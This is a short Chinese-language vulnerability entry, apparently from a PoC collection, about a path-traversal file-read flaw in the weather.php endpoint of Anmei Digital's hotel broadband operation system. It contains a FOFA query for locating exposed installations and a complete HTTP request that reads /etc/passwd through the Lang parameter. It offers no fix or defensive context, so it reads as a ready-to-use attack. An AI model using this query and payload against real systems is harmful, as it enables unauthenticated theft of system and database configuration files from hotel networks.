# 安美数字酒店宽带运营系统weather.php任意文件读取漏洞

安美数字酒店宽带运营系统 weather.php 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

## fofa

```yaml
app="安美数字-酒店宽带运营系统"
```

## poc

```java
GET /user/weather.php?Lang=../../../etc/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408122118099.png)